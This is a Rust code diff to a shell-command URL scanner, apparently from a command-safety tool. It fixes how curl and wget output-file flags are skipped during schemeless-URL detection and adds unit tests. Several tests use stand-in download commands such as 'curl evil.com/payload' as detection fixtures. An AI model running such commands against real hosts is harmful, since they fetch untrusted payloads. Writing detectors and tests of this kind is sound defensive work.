@@ -226,6 +226,8 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
 
     for (seg_idx, segment) in segments.iter().enumerate() {
         // Extract standard URLs from command + args (not raw text, to skip env-prefix values).
+        // Since URL_REGEX stops at whitespace, scanning individual words is equivalent to
+        // scanning the non-env-prefix portion of the raw text.
         let mut url_sources: Vec<&str> = Vec::new();
         if let Some(ref cmd) = segment.command {
             url_sources.push(cmd.as_str());
@@ -254,13 +256,11 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
         });
         if is_sink_context(segment, &segments) && !is_docker_cmd {
             for (arg_idx, arg) in segment.args.iter().enumerate() {
-                // Skip args that are values of output-file flags (e.g. curl -o file.png)
-                if segment
-                    .command
-                    .as_ref()
-                    .is_some_and(|c| is_output_flag_value(c, &segment.args, arg_idx))
-                {
-                    continue;
+                // Skip args that are output-file flag values
+                if let Some(cmd) = &segment.command {
+                    if is_output_flag_value(cmd, &segment.args, arg_idx) {
+                        continue;
+                    }
                 }
                 let clean = strip_quotes(arg);
                 if looks_like_schemeless_host(&clean) && !URL_REGEX.is_match(&clean) {
@@ -525,6 +525,55 @@ fn is_interpreter(cmd: &str) -> bool {
     )
 }
 
+/// Check if an arg at the given index is the value of an output-file flag for the given command.
+/// Returns true if this arg should be skipped during schemeless URL detection.
+fn is_output_flag_value(cmd: &str, args: &[String], arg_index: usize) -> bool {
+    let cmd_lower = cmd.to_lowercase();
+    let cmd_base = cmd_lower.rsplit('/').next().unwrap_or(&cmd_lower);
+
+    match cmd_base {
+        "curl" => {
+            // Check if previous arg is -o or --output
+            if arg_index > 0 {
+                let prev = strip_quotes(&args[arg_index - 1]);
+                if prev == "-o" || prev == "--output" {
+                    return true;
+                }
+            }
+            // Check if current arg starts with -o (combined: -oFILE)
+            let current = strip_quotes(&args[arg_index]);
+            if current.starts_with("-o") && current.len() > 2 && !current.starts_with("--") {
+                return true;
+            }
+            // Check --output=FILE
+            if current.starts_with("--output=") {
+                return true;
+            }
+            false
+        }
+        "wget" => {
+            // Check if previous arg is -O or --output-document
+            if arg_index > 0 {
+                let prev = strip_quotes(&args[arg_index - 1]);
+                if prev == "-O" || prev == "--output-document" {
+                    return true;
+                }
+            }
+            // Check -OFILE (combined short form)
+            let current = strip_quotes(&args[arg_index]);
+            if current.starts_with("-O") && current.len() > 2 && !current.starts_with("--") {
+                return true;
+            }
+            // Check --output-document=FILE
+            if current.starts_with("--output-document=") {
+                return true;
+            }
+            false
+        }
+        _ => false,
+    }
+}
+
 fn strip_quotes(s: &str) -> String {
     let s = s.trim();
     if s.len() >= 2
@@ -533,44 +582,6 @@ fn strip_quotes(s: &str) -> String {
         s[1..s.len() - 1].to_string()
     } else {
         s.to_string()
-    }
-}
-
-/// Check if an argument at `arg_index` is the value of an output-file flag.
-/// Covers curl -o/--output and wget -O/--output-document, including combined forms.
-fn is_output_flag_value(cmd: &str, args: &[String], arg_index: usize) -> bool {
-    let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
-
-    match cmd_base.as_str() {
-        "curl" => {
-            if arg_index > 0 {
-                let prev = &args[arg_index - 1];
-                if prev == "-o" || prev == "--output" {
-                    return true;
-                }
-            }
-            // Combined form: -oFILE (starts with -o but is longer than 2 chars)
-            let arg = &args[arg_index];
-            if arg.starts_with("-o") && arg.len() > 2 && !arg.starts_with("--") {
-                return false; // This IS the flag+value combo, not a separate value
-            }
-            false
-        }
-        "wget" => {
-            if arg_index > 0 {
-                let prev = &args[arg_index - 1];
-                if prev == "-O" || prev == "--output-document" {
-                    return true;
-                }
-            }
-            // Combined form: -OFILE
-            let arg = &args[arg_index];
-            if arg.starts_with("-O") && arg.len() > 2 && !arg.starts_with("--") {
-                return false; // This IS the flag+value combo
-            }
-            false
-        }
-        _ => false,
     }
 }
 
@@ -594,11 +605,10 @@ fn looks_like_schemeless_host(s: &str) -> bool {
             ".sh", ".py", ".rb", ".js", ".ts", ".go", ".rs", ".c", ".h", ".txt", ".md", ".json",
             ".yaml", ".yml", ".xml", ".html", ".css", ".tar.gz", ".tar.bz2", ".tar.xz", ".tgz",
             ".zip", ".gz", ".bz2", ".rpm", ".deb", ".pkg", ".dmg", ".exe", ".msi", ".dll", ".so",
-            ".log", ".conf", ".cfg", ".ini", ".toml",
-            // Conservative non-TLD extensions (filenames not domains)
-            ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".ico", ".tiff", ".tif", ".pdf", ".csv",
-            ".mp3", ".mp4", ".wav", ".avi", ".mkv", ".flac", ".ogg", ".webm", ".ttf", ".otf",
-            ".woff", ".woff2", ".docx", ".xlsx", ".pptx", ".sqlite",
+            ".log", ".conf", ".cfg", ".ini", ".toml", ".png", ".jpg", ".jpeg", ".gif", ".bmp",
+            ".ico", ".tiff", ".tif", ".pdf", ".csv", ".mp3", ".mp4", ".wav", ".avi", ".mkv",
+            ".flac", ".ogg", ".webm", ".ttf", ".otf", ".woff", ".woff2", ".docx", ".xlsx", ".pptx",
+            ".sqlite",
         ];
         if file_exts.iter().any(|ext| host_lower.ends_with(ext)) {
             return false;
@@ -925,31 +935,6 @@ mod tests {
             .expect("Generated paste pattern must be valid regex");
     }
 
-    #[test]
-    fn test_schemeless_tld_overlap_with_path_is_domain() {
-        assert!(looks_like_schemeless_host("evil.zip/payload"));
-        assert!(looks_like_schemeless_host("evil.sh/payload"));
-    }
-
-    #[test]
-    fn test_schemeless_tld_overlap_without_path_is_file() {
-        assert!(!looks_like_schemeless_host("lenna.zip"));
-        assert!(!looks_like_schemeless_host("script.sh"));
-    }
-
-    #[test]
-    fn test_schemeless_tld_overlap_sink_context_detected() {
-        let urls = extract_urls("curl evil.zip/payload", ShellType::Posix);
-        let schemeless: Vec<_> = urls
-            .iter()
-            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
-            .collect();
-        assert!(
-            !schemeless.is_empty(),
-            "evil.zip/payload should be detected as schemeless URL in sink context"
-        );
-    }
-
     // ─── CR normalization tests ───
 
     #[test]
@@ -1003,6 +988,102 @@ mod tests {
         assert!(
             !result.has_control_chars,
             "lone trailing \\r should not be flagged"
+        );
+    }
+
+    #[test]
+    fn test_schemeless_skip_curl_output_flag() {
+        let urls = extract_urls("curl -o lenna.png https://example.com", ShellType::Posix);
+        // Should NOT have schemeless URL for lenna.png
+        let schemeless: Vec<_> = urls
+            .iter()
+            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
+            .collect();
+        assert!(
+            schemeless.is_empty(),
+            "lenna.png should not be detected as schemeless URL"
+        );
+    }
+
+    #[test]
+    fn test_schemeless_skip_curl_output_combined() {
+        let urls = extract_urls("curl -olenna.png https://example.com", ShellType::Posix);
+        let schemeless: Vec<_> = urls
+            .iter()
+            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
+            .collect();
+        assert!(
+            schemeless.is_empty(),
+            "-olenna.png should not be detected as schemeless URL"
+        );
+    }
+
+    #[test]
+    fn test_schemeless_skip_wget_output_flag() {
+        let urls = extract_urls("wget -O output.html https://example.com", ShellType::Posix);
+        let schemeless: Vec<_> = urls
+            .iter()
+            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
+            .collect();
+        assert!(
+            schemeless.is_empty(),
+            "output.html should not be detected as schemeless URL"
+        );
+    }
+
+    #[test]
+    fn test_schemeless_skip_wget_combined() {
+        let urls = extract_urls("wget -Ooutput.html https://example.com", ShellType::Posix);
+        let schemeless: Vec<_> = urls
+            .iter()
+            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
+            .collect();
+        assert!(
+            schemeless.is_empty(),
+            "-Ooutput.html should not be detected as schemeless URL"
+        );
+    }
+
+    #[test]
+    fn test_schemeless_real_domain_still_detected() {
+        let urls = extract_urls("curl evil.com/payload", ShellType::Posix);
+        let schemeless: Vec<_> = urls
+            .iter()
+            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
+            .collect();
+        assert!(
+            !schemeless.is_empty(),
+            "evil.com/payload should be detected as schemeless URL"
+        );
+    }
+
+    #[test]
+    fn test_schemeless_png_no_slash_is_file() {
+        assert!(!looks_like_schemeless_host("lenna.png"));
+    }
+
+    #[test]
+    fn test_schemeless_tld_overlap_with_path_is_domain() {
+        assert!(looks_like_schemeless_host("evil.zip/payload"));
+        assert!(looks_like_schemeless_host("evil.sh/payload"));
+    }
+
+    #[test]
+    fn test_schemeless_tld_overlap_without_path_is_file() {
+        assert!(!looks_like_schemeless_host("lenna.zip"));
+        assert!(!looks_like_schemeless_host("script.sh"));
+    }
+
+    #[test]
+    fn test_schemeless_tld_overlap_sink_context_detected() {
+        let urls = extract_urls("curl evil.zip/payload", ShellType::Posix);
+        let schemeless: Vec<_> = urls
+            .iter()
+            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
+            .collect();
+        assert!(
+            !schemeless.is_empty(),
+            "evil.zip/payload should be detected as schemeless URL in sink context"
         );
     }
 }
